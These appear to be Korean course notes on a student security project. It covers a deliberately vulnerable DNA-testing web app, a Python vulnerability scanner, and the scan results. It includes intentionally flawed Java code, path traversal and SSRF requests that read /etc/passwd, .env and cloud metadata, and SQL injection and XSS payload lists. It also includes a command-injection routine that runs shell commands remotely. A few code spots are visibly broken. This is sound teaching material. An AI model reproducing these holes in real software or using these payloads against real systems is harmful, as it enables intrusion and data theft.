    DnaResult result = resultRepository.findByUserId(userId);
    return ResponseEntity.ok(result);
}
```

**공격 시나리오**:
```bash
# 정상 사용자 (user_id = 10)가 자신의 결과 조회
GET /api/dna/results/10
Authorization: Bearer user10_token

# 공격자가 URL 파라미터 변경으로 타인의 결과 조회 시도
GET /api/dna/results/11  # 다른 사람의 결과
GET /api/dna/results/12
GET /api/dna/results/13
# ... 순차적으로 모든 사용자의 유전 정보 탈취 가능!
```

#### 4. DNA Matching (DNA 매칭)

**개념**:
- 사용자의 DNA와 유사한 다른 사용자를 찾아주는 기능
- 친척 관계 추정 (2촌, 3촌 등)

**취약점**:
```java
// 취약점: 모든 사용자의 매칭 정보 노출
@GetMapping("/api/dna/matching")
public ResponseEntity<?> findMatches(@RequestParam Long userId) {
    // 권한 검증 없음
    List<DnaMatch> matches = matchingService.findMatchesByUserId(userId);

    // 취약점: 민감한 유전 정보까지 모두 반환
    return ResponseEntity.ok(matches);
}
```

#### 5. 자료실 - 파일 다운로드 취약점

발표 내용:

> "자료실에서는 이렇게 **파일 다운로드 취약점**과 **OS 커맨드 인젝션**을 이용해서..."

**Path Traversal 취약점**:
```java
// 취약한 파일 다운로드
@GetMapping("/api/files/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
    // 취약점: 경로 검증 없음
    Path filePath = Paths.get("/uploads/" + filename);
    Resource resource = new FileSystemResource(filePath.toFile());

    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + filename + "\"")
        .body(resource);
}
```

**공격 시나리오**:
```bash
# 정상적인 파일 다운로드
GET /api/files/download?filename=document.pdf

# Path Traversal 공격
GET /api/files/download?filename=../../../../etc/passwd
GET /api/files/download?filename=../../application.properties  # DB 접속 정보 노출
GET /api/files/download?filename=../../../.env  # 환경 변수 파일 탈취
```

#### 6. 외부 연결 테스트 - SSRF

발표 내용:

> "외부 연결 테스트로 원래는 이제 관리자만 볼 수 있는 페이지인데 여기서 role을 admin으로 바꾸면 바로 이렇게 볼 수 있습니다.
> 여기서 **SSRF 공격**도 가능합니다. **내부망을 좀 구경**할 수 있죠."

**SSRF (Server-Side Request Forgery) 취약점**:
```java
// 취약한 외부 연결 테스트 기능
@GetMapping("/api/admin/network-test")
public ResponseEntity<?> testConnection(@RequestParam String url) {
    // 취약점: URL 검증 없음
    try {
        RestTemplate restTemplate = new RestTemplate();
        String response = restTemplate.getForObject(url, String.class);
        return ResponseEntity.ok(response);
    } catch (Exception e) {
        return ResponseEntity.status(500).body("Connection failed: " + e.getMessage());
    }
}
```

**공격 시나리오**:
```bash
# 내부망 스캔
GET /api/admin/network-test?url=http://10.0.0.1:22
GET /api/admin/network-test?url=http://10.0.0.1:3306  # DB 서버 접근
GET /api/admin/network-test?url=http://169.254.169.254/latest/meta-data/  # AWS 메타데이터 탈취

# 로컬 파일 읽기 (file:// 프로토콜)
GET /api/admin/network-test?url=file:///etc/passwd
```

#### 7. 마이페이지 - SQL Injection

발표 내용:

> "그리고 사실 처음에도 SQL 인젝션으로 이렇게 **관리자 계정으로 들어올 수 있는** 것도 보실 수 있습니다."

**SQL Injection을 통한 관리자 로그인**:
```java
// 취약한 로그인 처리
@PostMapping("/api/auth/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    String username = request.getUsername();
    String password = request.getPassword();

    // 취약점: 문자열 연결로 SQL 쿼리 생성
    String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

    // JDBC로 직접 실행
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(sql);

    if (rs.next()) {
        String token = generateJWT(rs.getString("user_id"), rs.getString("role"));
        return ResponseEntity.ok(new LoginResponse(token));
    } else {
        return ResponseEntity.status(401).body("Invalid credentials");
    }
}
```

**공격**:
```bash
# 입력값
username: admin' OR '1'='1'--
password: anything

# 실제 실행되는 SQL
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'

# '1'='1'은 항상 참이므로 첫 번째 사용자(보통 관리자)로 로그인됨
```

### 3.9.4 의도적으로 내장된 주요 취약점 정리

| 취약점 유형 | 위치 | 설명 | OWASP Top 10 |
|-----------|------|------|--------------|
| SQL Injection | 로그인, 검색 | Prepared Statement 미사용 | A03:2021 Injection |
| XSS (Stored) | DNA 검사 신청 메모 | 입력값 필터링 없음 | A03:2021 Injection |
| IDOR | DNA 결과 조회, DNA 매칭 | 권한 검증 부족 | A01:2021 Broken Access Control |
| Path Traversal | 파일 다운로드 | 경로 검증 없음 | A01:2021 Broken Access Control |
| SSRF | 외부 연결 테스트 | URL 검증 부족 | A10:2021 SSRF |
| 인증 우회 | 관리자 페이지 | Role 쿠키 변조 가능 | A07:2021 Authentication Failures |
| 평문 비밀번호 저장 | 전체 | 해시 처리 없음 | A02:2021 Cryptographic Failures |

---

## 3.10 자동화 취약점 진단 시스템

### 3.10.1 진단 시스템 개요

3조는 수동 점검의 한계를 극복하기 위해 자동화된 취약점 진단 시스템을 개발했습니다.

**진단 시스템 특징**:
1. **웹 크롤링**: 사이트의 모든 페이지 자동 탐색
2. **다양한 취약점 스캔**: 15가지 웹 공격 시나리오 + OS 50개 진단
3. **다중 리포트 형식**: TXT, HTML, PDF 지원
4. **정적/동적 분석 분리**: 선택적 실행 가능

### 3.10.2 진단 시스템 아키텍처

**헬프 기능**:

> "저희는 조금 특이하게 **헬프 기능을 좀 만들어놨습니다**.
> 처음 보는 사람도 조금 이해하실 게 어떻게 구동하는지..."

```bash
# 스캐너 실행 방법
python main.py                    # 기본 타겟 (default target) 스캔
python main.py -t http://custom-target.com  # 커스텀 타겟 스캔
python main.py --help             # 도움말 표시
```

**실행 화면**:
```
=== Rookies DNA Security Scanner ===

스캔 모드를 선택하세요:
1. 정적 분석 (Static Analysis)
2. 동적 분석 (Dynamic Analysis)
3. 전체 분석 (Static + Dynamic)

선택 (1/2/3):
```

**모드별 특징**:

| 모드 | 설명 | 포함 항목 | 실행 시간 |
|------|------|---------|----------|
| 정적 분석 | 주기적 점검용, 빠른 스캔 | 설정 파일 검사, 권한 점검 등 | 5-10분 |
| 동적 분석 | 실제 공격 시뮬레이션 | SQL Injection, XSS 등 | 30-60분 |
| 전체 분석 | 정적 + 동적 통합 | 모든 진단 항목 | 40-70분 |

### 3.10.3 웹 스캐너 구조

**main.py 기본 구조**:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
from scanners.static_scanner import StaticScanner
from scanners.dynamic_scanner import DynamicScanner
from reporters.report_generator import ReportGenerator

def print_banner():
    """배너 출력"""
    print("""
    ╔═══════════════════════════════════════╗
    ║  Rookies DNA Security Scanner v1.0   ║
    ║  DNA Lab 취약점 진단 자동화 도구    ║
    ╚═══════════════════════════════════════╝
    """)

def print_help():
    """도움말 출력"""
    print("""
사용법:
    python main.py                       # 기본 타겟 스캔
    python main.py -t <URL>              # 커스텀 타겟 스캔
    python main.py -m static             # 정적 분석만
    python main.py -m dynamic            # 동적 분석만
    python main.py -o /path/to/report    # 리포트 저장 경로 지정

옵션:
    -t, --target <URL>        스캔 대상 URL
    -m, --mode <mode>         스캔 모드 (static/dynamic/full)
    -o, --output <path>       리포트 저장 경로
    -h, --help                도움말 표시
    """)

def main():
    parser = argparse.ArgumentParser(description="Rookies DNA Security Scanner")
    parser.add_argument('-t', '--target', default='http://localhost:8080', help='Target URL')
    parser.add_argument('-m', '--mode', choices=['static', 'dynamic', 'full'], default='full', help='Scan mode')
    parser.add_argument('-o', '--output', default='./reports', help='Output directory')

    args = parser.parse_args()

    print_banner()

    # 모드 선택
    if args.mode == 'full':
        print("\n[*] 전체 분석을 시작합니다...")
        print("    1. 정적 분석")
        print("    2. 동적 분석")

        static_results = run_static_scan(args.target)
        dynamic_results = run_dynamic_scan(args.target)

        results = {
            "static": static_results,
            "dynamic": dynamic_results
        }

    elif args.mode == 'static':
        print("\n[*] 정적 분석을 시작합니다...")
        results = {"static": run_static_scan(args.target)}

    elif args.mode == 'dynamic':
        print("\n[*] 동적 분석을 시작합니다...")
        results = {"dynamic": run_dynamic_scan(args.target)}

    # 리포트 생성
    print("\n[*] 리포트를 생성합니다...")
    generate_reports(results, args.output)

    print("\n[+] 스캔 완료!")
    print(f"[+] 리포트 저장 위치: {args.output}/")

def run_static_scan(target_url):
    """정적 분석 실행"""
    scanner = StaticScanner(target_url)
    return scanner.scan()

def run_dynamic_scan(target_url):
    """동적 분석 실행"""
    scanner = DynamicScanner(target_url)
    return scanner.scan()

def generate_reports(results, output_dir):
    """리포트 생성 (TXT, HTML, PDF)"""
    generator = ReportGenerator(results, output_dir)
    generator.generate_txt()
    generator.generate_html()
    generator.generate_pdf()

if __name__ == "__main__":
    main()
```

### 3.10.4 웹 취약점 스캐너 (16개 항목)

#### SQL Injection 스캐너

발표 내용:

> "저희가 의도적으로 SQL 인젝션에 좀 많은 비중을 두고 제일 중요하다고 생각했기 때문에
> 이 부분이 좀 많이 오래 걸립니다."

**SQL Injection 스캐너 구현**:
```python
# scanners/sql_injection_scanner.py

class SQLInjectionScanner:
    """
    SQL Injection 취약점 스캐너
    """

    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self._load_payloads()
        self.results = []

    def _load_payloads(self):
        """SQL Injection 페이로드 로드"""
        return [
            # 인증 우회
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'#",
            "') OR ('1'='1",

            # UNION 기반
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT username, password FROM users--",

            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",

            # Time-based Blind
            "' AND IF(1=1, SLEEP(5), 0)--",

            # Boolean-based Blind
            "' AND '1'='1",
            "' AND '1'='2",
        ]

    def scan(self):
        """SQL Injection 스캔 실행"""
        print("[*] SQL Injection 스캔 시작...")

        # 스캔 대상 엔드포인트
        endpoints = [
            "/api/auth/login",
            "/api/dna/search",
            "/api/users/profile",
        ]

        for endpoint in endpoints:
            for payload in self.payloads:
                result = self._test_payload(endpoint, payload)
                self.results.append(result)
                time.sleep(0.5)  # Rate limiting

        print(f"[+] SQL Injection 스캔 완료: {len(self.results)}건 테스트")
        return self.results

    def _test_payload(self, endpoint, payload):
        """개별 페이로드 테스트"""
        url = f"{self.target_url}{endpoint}"

        try:
            # POST 요청 전송
            response = requests.post(
                url,
                json={"username": payload, "password": "test"},
                timeout=10
            )

            # 취약점 징후 탐지
            is_vulnerable = self._detect_sql_injection(response)

            return {
                "endpoint": endpoint,
                "payload": payload,
                "vulnerable": is_vulnerable,
                "status_code": response.status_code,
                "evidence": response.text[:200] if is_vulnerable else None
            }

        except Exception as e:
            return {
                "endpoint": endpoint,
                "payload": payload,
                "error": str(e)
            }

    def _detect_sql_injection(self, response):
        """SQL Injection 징후 탐지"""
        response_text = response.text.lower()

        # SQL 에러 패턴
        sql_error_patterns = [
            "sql syntax",
            "mysql error",
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "mysqli_",
            "sqlstate",
            "syntax error",
        ]

        return any(pattern in response_text for pattern in sql_error_patterns)
```

#### XSS (Cross-Site Scripting) 스캐너

발표 내용:

> "벌써 XSS 스캐너에서 취약하다고 뜨고 있네요."

**XSS 스캐너 구현**:
```python
# scanners/xss_scanner.py

class XSSScanner:
    """
    XSS (Cross-Site Scripting) 취약점 스캐너
    """

    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            # 기본 스크립트
            "<script>alert('XSS')</script>",

            # 이벤트 핸들러
            "",
            "<body onload=alert('XSS')>",

            # 인코딩 우회
            "<script>alert(String.fromCharCode(88,83,83))</script>",

            # DOM 기반
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]

    def scan(self):
        """XSS 스캔 실행"""
        print("[*] XSS 스캔 시작...")

        # 테스트 대상 입력 필드
        test_fields = [
            {"endpoint": "/api/dna/exams", "field": "memo"},
            {"endpoint": "/api/users/profile", "field": "bio"},
            {"endpoint": "/api/comments", "field": "content"},
        ]

        results = []
        for test in test_fields:
            for payload in self.payloads:
                result = self._test_xss(test["endpoint"], test["field"], payload)
                results.append(result)

        print(f"[+] XSS 스캔 완료: {len(results)}건 테스트")
        return results

    def _test_xss(self, endpoint, field_name, payload):
        """XSS 페이로드 테스트"""
        url = f"{self.target_url}{endpoint}"

        try:
            # 페이로드 삽입
            response_post = requests.post(
                url,
                json={field_name: payload},
                timeout=10
            )

            # 삽입된 내용 조회
            response_get = requests.get(url, timeout=10)

            # 페이로드가 인코딩 없이 그대로 반환되는지 확인
            is_vulnerable = payload in response_get.text

            return {
                "endpoint": endpoint,
                "field": field_name,
                "payload": payload,
                "vulnerable": is_vulnerable
            }

        except Exception as e:
            return {
                "endpoint": endpoint,
                "error": str(e)
            }
```

### 3.10.5 OS 스캐너 (50개 항목)

**OS 스캐너 실행**:

> "OS 스캔도 잠깐 보시겠습니다. OS 스캔은 저희가 타겟 URL 또한 바꿀 수 있게 해놨고요.
> 그 웹스캐너랑 똑같이, 그리고 **로컬과 리모트**로 나눠놨습니다."

**로컬 vs 리모트**:

| 모드 | 설명 | 실행 방식 | 사용 시나리오 |
|------|------|----------|-------------|
| 로컬 | OS에 직접 접근 | 직접 명령 실행 | 서버에 직접 로그인한 경우 |
| 리모트 | OS 커맨드 인젝션 활용 | 웹 취약점 악용 | 외부에서 원격 진단 |

**OS 스캐너 구조**:
```python
# scanners/os_scanner.py

class OSScanner:
    """
    OS 보안 설정 점검 스캐너
    """

    def __init__(self, target, mode='local'):
        self.target = target
        self.mode = mode  # 'local' or 'remote'
        self.checks = self._load_checks()

    def _load_checks(self):
        """OS 점검 항목 로드"""
        return [
            # 계정 관리
            {"id": "OS-001", "name": "불필요한 계정 존재 여부", "command": "cat /etc/passwd"},
            {"id": "OS-002", "name": "패스워드 복잡도 정책", "command": "cat /etc/login.defs"},

            # 권한 설정
            {"id": "OS-003", "name": "중요 파일 권한 설정", "command": "ls -l /etc/passwd /etc/shadow"},
            {"id": "OS-004", "name": "SUID 파일 점검", "command": "find / -perm -4000 2>/dev/null"},

            # 네트워크
            {"id": "OS-005", "name": "열린 포트 점검", "command": "netstat -tuln"},
            {"id": "OS-006", "name": "방화벽 정책", "command": "iptables -L -n"},

            # 서비스
            {"id": "OS-007", "name": "불필요한 서비스 실행 여부", "command": "systemctl list-units --type=service"},

            # 로그
            {"id": "OS-008", "name": "시스템 로그 설정", "command": "cat /etc/rsyslog.conf"},

            # ... (총 50개 항목)
        ]

    def scan(self):
        """OS 스캔 실행"""
        print(f"[*] OS 스캔 시작 (모드: {self.mode})...")

        results = []
        for check in self.checks:
            if self.mode == 'local':
                result = self._check_local(check)
            else:  # remote
                result = self._check_remote(check)

            results.append(result)

        print(f"[+] OS 스캔 완료: {len(results)}건 점검")
        return results

    def _check_local(self, check):
        """로컬 OS 점검"""
        try:
            # 직접 명령 실행
            output = subprocess.check_output(
                check['command'],
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=10
            ).decode('utf-8')

            # 결과 분석
            is_vulnerable = self._analyze_result(check['id'], output)

            return {
                "check_id": check['id'],
                "check_name": check['name'],
                "vulnerable": is_vulnerable,
                "output": output[:500]  # 처음 500자만
            }

        except Exception as e:
            return {
                "check_id": check['id'],
                "error": str(e)
            }

    def _check_remote(self, check):
        """리모트 OS 점검 (커맨드 인젝션 취약점 활용)"""
        try:
            # OS 커맨드 인젝션 취약점 활용
            # 예: /api/admin/network-test?url=http://localhost:8080; <command>
            injected_command = f"; {check['command']}"

            response = requests.get(
                f"{self.target}/api/admin/network-test",
                params={"url": f"http://localhost{injected_command}"},
                timeout=10
            )

            # 결과 분석
            is_vulnerable = self._analyze_result(check['id'], response.text)

            return {
                "check_id": check['id'],
                "check_name": check['name'],
                "vulnerable": is_vulnerable,
                "output": response.text[:500]
            }

        except Exception as e:
            return {
                "check_id": check['id'],
                "error": str(e)
            }

    def _analyze_result(self, check_id, output):
        """결과 분석 로직"""
        # 각 점검 항목별 분석 기준
        analysis_rules = {
            "OS-001": lambda o: "nologin" not in o,  # 로그인 가능한 불필요 계정 존재
            "OS-002": lambda o: "PASS_MIN_LEN" not in o or int(re.search(r'PASS_MIN_LEN\s+(\d+)', o).group(1)) < 8,
            "OS-003": lambda o: "rw-rw-rw-" in o or "rwxrwxrwx" in o,  # 과도한 권한
            "OS-004": lambda o: len(o.split('\n')) > 10,  # SUID 파일 과다
            "OS-005": lambda o: "0.0.0.0" in o,  # 모든 인터페이스에 바인딩
            # ... (각 항목별 분석 규칙)
        }

        analysis_func = analysis_rules.get(check_id, lambda o: False)
        return analysis_func(output)
```

### 3.10.6 리포트 생성 (TXT, HTML, PDF)

발표 내용:

> "보시면 여기 3개의 파일이 생성된 것을 보실 수 있습니다. TXT, HTML, PDF.
> 그래서 저희 진단서는 이렇게 PDF로 나오는데요."

**리포트 생성기 구조**:
```python
# reporters/report_generator.py

from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import jinja2

class ReportGenerator:
    """
    진단 결과 리포트 생성기
    """

    def __init__(self, scan_results, output_dir):
        self.results = scan_results
        self.output_dir = output_dir
        self.stats = self._calculate_statistics()

    def _calculate_statistics(self):
        """통계 계산"""
        total_scanners = len(self.results.get('static', [])) + len(self.results.get('dynamic', []))
        vulnerable_count = sum(1 for r in self.results.get('static', []) + self.results.get('dynamic', []) if r.get('vulnerable'))

        return {
            "total_scanners": total_scanners,
            "vulnerable": vulnerable_count,
            "safe": total_scanners - vulnerable_count,
            "vulnerability_rate": (vulnerable_count / total_scanners * 100) if total_scanners > 0 else 0
        }

    def generate_txt(self):
        """TXT 리포트 생성"""
        output_file = f"{self.output_dir}/report.txt"

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("Rookies DNA Security Scan Report\n")
            f.write("=" * 80 + "\n\n")

            f.write(f"총 스캐너 수: {self.stats['total_scanners']}개\n")
            f.write(f"취약: {self.stats['vulnerable']}개\n")
            f.write(f"안전: {self.stats['safe']}개\n")
            f.write(f"취약률: {self.stats['vulnerability_rate']:.2f}%\n\n")

            # 상세 결과
            f.write("-" * 80 + "\n")
            f.write("상세 결과\n")
            f.write("-" * 80 + "\n\n")

            for scanner, results in self.results.items():
                f.write(f"\n[{scanner.upper()} 분석 결과]\n")
                for result in results:
                    status = "[취약]" if result.get('vulnerable') else "[안전]"
                    f.write(f"{status} {result.get('check_name', result.get('endpoint'))}\n")

        print(f"[+] TXT 리포트 생성 완료: {output_file}")

    def generate_html(self):
        """HTML 리포트 생성"""
        output_file = f"{self.output_dir}/report.html"

        # Jinja2 템플릿
        template_str = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Rookies DNA Security Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        .stats { background: #ecf0f1; padding: 15px; border-radius: 5px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #bdc3c7; padding: 10px; text-align: left; }
        th { background: #34495e; color: white; }
        .vulnerable { background: #e74c3c; color: white; }
        .safe { background: #27ae60; color: white; }
    </style>
</head>
<body>
    <h1>Rookies DNA Security Scan Report</h1>

    <div class="stats">
        <h2>통계</h2>
        <p>총 스캐너 수: {{ stats.total_scanners }}개</p>
        <p>취약: <span class="vulnerable">{{ stats.vulnerable }}개</span></p>
        <p>안전: <span class="safe">{{ stats.safe }}개</span></p>
        <p>취약률: {{ "%.2f"|format(stats.vulnerability_rate) }}%</p>
    </div>

    <h2>상세 결과</h2>
    <table>
        <tr>
            <th>점검 항목</th>
            <th>상태</th>
            <th>증거</th>
        </tr>
        
            
            <tr>
                <td>{{ result.get('check_name', result.get('endpoint')) }}</td>
                <td class="{{ 'vulnerable' if result.get('vulnerable') else 'safe' }}">
                    {{ '취약' if result.get('vulnerable') else '안전' }}
                </td>
                <td>{{ result.get('evidence', '-')[:100] }}</td>
            </tr>
            
        
    </table>
</body>
</html>
        """

        template = jinja2.Template(template_str)
        html_content = template.render(stats=self.stats, scan_results=self.results)

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"[+] HTML 리포트 생성 완료: {output_file}")

    def generate_pdf(self):
        """PDF 리포트 생성"""
        output_file = f"{self.output_dir}/report.pdf"

        c = canvas.Canvas(output_file, pagesize=letter)
        width, height = letter

        # 제목
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, height - 50, "Rookies DNA Security Scan Report")

        # 통계
        c.setFont("Helvetica", 12)
        y = height - 100
        c.drawString(50, y, f"총 스캐너 수: {self.stats['total_scanners']}개")
        c.drawString(50, y - 20, f"취약: {self.stats['vulnerable']}개")
        c.drawString(50, y - 40, f"안전: {self.stats['safe']}개")
        c.drawString(50, y - 60, f"취약률: {self.stats['vulnerability_rate']:.2f}%")

        # 상세 결과 (페이지 분할 처리 필요)
        y = y - 100
        c.setFont("Helvetica-Bold", 12)
        c.drawString(50, y, "상세 결과")

        y -= 20
        c.setFont("Helvetica", 10)
        for scanner, results in self.results.items():
            for result in results:
                if y < 50:  # 페이지 끝에 도달하면 새 페이지
                    c.showPage()
                    c.setFont("Helvetica", 10)
                    y = height - 50

                status = "[취약]" if result.get('vulnerable') else "[안전]"
                name = result.get('check_name', result.get('endpoint', 'Unknown'))
                c.drawString(50, y, f"{status} {name}")
                y -= 15

        c.save()
        print(f"[+] PDF 리포트 생성 완료: {output_file}")
```

---

**(계속 - section3_team3_part2.md로 이어짐: 진단 결과, 강사 피드백, 프로젝트 평가 등)**
# Section 3: 6조 + 3조 프로젝트 상세 분석 (계속)

## Part 2-2: 3조 "헬릭스" - 진단 결과 및 프로젝트 평가

---

## 3.11 진단 결과 분석

### 3.11.1 전체 진단 결과 요약

발표 내용:

> "진단 결과를 보시면 토탈 리절트는 **43.9%**, 총 **66개의 스캐너 중에 29개에서 취약점이 발견**이 됐고요."

**종합 통계**:

| 구분 | 전체 스캐너 수 | 취약 스캐너 수 | 안전 스캐너 수 | 취약점 발견 건수 | 취약율 |
|------|--------------|--------------|--------------|----------------|--------|
| **전체** | 66개 | 29개 | 37개 | 153건 | 43.9% |
| **웹** | 16개 | 15개 | 1개 | 74건 | 93.8% |
| **OS** | 50개 | 14개 | 36개 | 79건 | 28.0% |

**시각화 데이터**:
```
전체 취약점 분포 (파이 차트)
┌─────────────────────────────┐
│  취약 43.9%  ███████████    │
│  안전 56.1%  ████████████   │
└─────────────────────────────┘

영역별 취약율 (막대 그래프)
웹:  ████████████████████ 93.8%
OS:  ██████               28.0%
```

### 3.11.2 웹 취약점 진단 결과 (93.8% 취약)

발표 내용:

> "웹은 상당히 심각하죠. 93%, 거의 95%에 육박하는 부분이 취약하다."

**웹 스캐너별 결과**:

| 스캐너 번호 | 취약점 유형 | 상태 | 발견 건수 | 심각도 |
|----------|-----------|------|----------|--------|
| 1 | SQL Injection | 취약 | 15건 | Critical |
| 2 | Cross-Site Scripting (XSS) | 취약 | 12건 | High |
| 3 | CSRF | 취약 | 8건 | High |
| 4 | IDOR (권한 검증 미흡) | 취약 | 9건 | High |
| 5 | Path Traversal | 취약 | 6건 | High |
| 6 | SSRF | 취약 | 4건 | Medium |
| 7 | OS Command Injection | 취약 | 3건 | Critical |
| 8 | 세션 관리 취약점 | 취약 | 5건 | High |
| 9 | 파일 업로드 취약점 | 취약 | 4건 | High |
| 10 | 정보 노출 | 취약 | 3건 | Medium |
| 11 | 비밀번호 복잡도 미흡 | 취약 | 2건 | Medium |
| 12 | 계정 잠금 미설정 | 취약 | 1건 | Low |
| 13 | 인증 우회 | 취약 | 1건 | Critical |
| 14 | 역직렬화 취약점 | 취약 | 1건 | Medium |
| 15 | 암호화되지 않은 통신 | 취약 | 전체 | High |
| 16 | HTTP 메서드 제한 | **안전** | 0건 | - |

**심각도별 분류**:

```markdown
## OWASP Top 10 기준 분류

### Critical (치명적) - 즉시 조치 필요
1. **SQL Injection** (A03:2021 Injection)
   - 15건 발견
   - 데이터베이스 전체 탈취 가능
   - 관리자 권한 탈취 위험

2. **OS Command Injection** (A03:2021 Injection)
   - 3건 발견
   - 서버 완전 장악 가능
   - 랜섬웨어 공격 위험

3. **인증 우회** (A07:2021 Authentication Failures)
   - 1건 발견
   - 전체 사용자 계정 탈취 가능

### High (높음) - 24시간 내 조치
1. **XSS** (A03:2021 Injection)
   - 12건 발견
   - 세션 하이재킹 가능

2. **CSRF** (A01:2021 Broken Access Control)
   - 8건 발견
   - 비의도적 작업 수행 위험

3. **IDOR** (A01:2021 Broken Access Control)
   - 9건 발견
   - 타인의 유전 정보 열람 가능

4. **Path Traversal** (A01:2021 Broken Access Control)
   - 6건 발견
   - 시스템 파일 접근 가능

5. **세션 관리 취약점** (A07:2021 Authentication Failures)
   - 5건 발견
   - 세션 고정, 세션 하이재킹

6. **파일 업로드** (A04:2021 Insecure Design)
   - 4건 발견
   - 웹쉘 업로드 위험

7. **암호화되지 않은 통신** (A02:2021 Cryptographic Failures)
   - 전체 통신
   - 중간자 공격 가능

### Medium (중간) - 1주일 내 조치
- SSRF: 4건
- 정보 노출: 3건
- 비밀번호 복잡도: 2건
- 역직렬화: 1건

### Low (낮음) - 1개월 내 조치
- 계정 잠금 미설정: 1건
```

**웹 취약점 상세 예시**:

#### SQL Injection 상세 결과 (15건)

```json
{
  "scanner_name": "SQL Injection Scanner",
  "total_tests": 30,
  "vulnerable_endpoints": 15,
  "details": [
    {
      "endpoint": "/api/auth/login",
      "payload": "admin' OR '1'='1'--",
      "status": "vulnerable",
      "evidence": "Successfully logged in as admin",
      "severity": "Critical",
      "cvss_score": 9.8
    },
    {
      "endpoint": "/api/dna/search",
      "payload": "' UNION SELECT username, password FROM users--",
      "status": "vulnerable",
      "evidence": "Database: rookies_dna, Table: users exposed",
      "severity": "Critical",
      "cvss_score": 9.1
    },
    {
      "endpoint": "/api/users/profile",
      "payload": "1' AND IF(1=1, SLEEP(5), 0)--",
      "status": "vulnerable",
      "evidence": "Response delayed by 5 seconds (Time-based Blind SQLi)",
      "severity": "High",
      "cvss_score": 8.6
    }
  ],
  "recommendation": "모든 SQL 쿼리에 Prepared Statement 적용 필수"
}
```

#### XSS 상세 결과 (12건)

```json
{
  "scanner_name": "XSS Scanner",
  "total_tests": 18,
  "vulnerable_fields": 12,
  "details": [
    {
      "endpoint": "/api/dna/exams",
      "field": "memo",
      "payload": "<script>alert('XSS')</script>",
      "status": "vulnerable",
      "type": "Stored XSS",
      "severity": "High",
      "evidence": "Script executed on results page"
    },
    {
      "endpoint": "/api/comments",
      "field": "content",
      "payload": "",
      "status": "vulnerable",
      "type": "Stored XSS",
      "severity": "High"
    },
    {
      "endpoint": "/api/users/profile",
      "field": "bio",
      "payload": "<svg/onload=alert('XSS')>",
      "status": "vulnerable",
      "type": "Stored XSS",
      "severity": "High"
    }
  ],
  "recommendation": "입력값 필터링 및 출력 인코딩 필수"
}
```

### 3.11.3 OS 취약점 진단 결과 (28% 취약)

발표 내용:

> "근데 OS는 28% 정도가 나왔습니다."

**OS 취약점 우선순위 (발표 내용 기반)**:

> "여기는 OS 부분인데요. **FTP 서비스**나 **비밀번호 최대기간**, **계정 잠금 미설정**이 순서대로 심각하다고 생각했고요.
> 비밀번호 관련이죠, 대부분. 아니면 평문 SNMP 이런 것도 굉장히 취약하면 안 되는데 이런 거를 보완해 줬으면 좋겠다."

| 우선순위 | 취약점 항목 | 발견 건수 | 심각도 | KISA 항목 코드 |
|---------|-----------|----------|--------|--------------|
| 1 | FTP 서비스 활성화 | 1건 | High | U-04 |
| 2 | 비밀번호 최대 사용 기간 미설정 | 1건 | Medium | U-02 |
| 3 | 계정 잠금 임계값 미설정 | 1건 | Medium | U-03 |
| 4 | 평문 SNMP 사용 | 1건 | Medium | U-68 |
| 5 | root 원격 접속 허용 | 1건 | High | U-01 |
| 6 | 불필요한 계정 존재 | 2건 | Low | U-05 |
| 7 | SUID/SGID 파일 과다 | 3건 | Medium | U-18 |
| 8 | 로그 파일 권한 과다 | 2건 | Low | U-43 |
| 9 | 열린 포트 과다 (0.0.0.0 바인딩) | 2건 | Medium | U-07 |

**OS 진단 결과 상세**:

#### 비밀번호 정책 미흡

```bash
# 진단 명령
cat /etc/login.defs | grep PASS_MAX_DAYS

# 결과
PASS_MAX_DAYS   99999

# 분석
# 99999일 ≈ 273년
# 실질적으로 비밀번호 만료 정책이 없는 상태
# 권고 사항: PASS_MAX_DAYS 90 (90일마다 변경)
```

**증거 스크린샷 내용 (발표 자료)**:
```
리눅스 시스템에서 명령어를 쳐보았더니 루트 계정의 패스워드 만료 기간이 네버로 뜬 것을 확인할 수 있고,
그 다음에 로그인 덱스 파일을 열어보았더니 패스 맥스데이스가 지금 99999로 설정된 것을 확인할 수 있었습니다.
이거는 이제 거의 약 273년 정도 되는 시간이기 때문에 273년 동안 같은 비밀번호를 사용한다는 것을 확인할 수 있습니다.
```

#### 로그 파일 권한 문제

```bash
# 진단 명령
ls -l /var/log/syslog /var/log/auth.log

# 결과
-rw-r--r-- 1 root adm 1234567 Jan 06 10:00 /var/log/syslog
-rw-r--r-- 1 root adm  234567 Jan 06 10:00 /var/log/auth.log

# 분석
# 일반 사용자도 읽기 권한 보유 (others: r)
# 보안상 중요한 인증 로그를 모든 사용자가 읽을 수 있음
# 권고 사항: chmod 640 /var/log/*.log
```

#### 방화벽 및 포트 관리

```bash
# 진단 명령
netstat -tuln | grep LISTEN

# 결과
tcp    0.0.0.0:22     0.0.0.0:*    LISTEN
tcp    0.0.0.0:3306   0.0.0.0:*    LISTEN
tcp    0.0.0.0:8080   0.0.0.0:*    LISTEN

# 분석
